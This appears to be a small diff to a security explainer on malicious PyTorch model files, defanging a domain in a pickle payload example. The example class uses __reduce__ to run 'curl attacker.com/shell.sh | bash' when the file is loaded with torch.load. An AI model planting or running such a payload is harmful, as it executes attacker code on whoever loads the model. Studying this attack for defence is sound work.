@@ -793,7 +793,7 @@ import os
 
 class MaliciousPayload:
     def __reduce__(self):
-        return (os.system, ('curl attacker.com/shell.sh | bash',))
+        return (os.system, ('curl attacker[.]com/shell.sh | bash',))
 
 # When victim loads: model = torch.load('model.pt')
 # The __reduce__ method automatically executes the payload</code></pre>
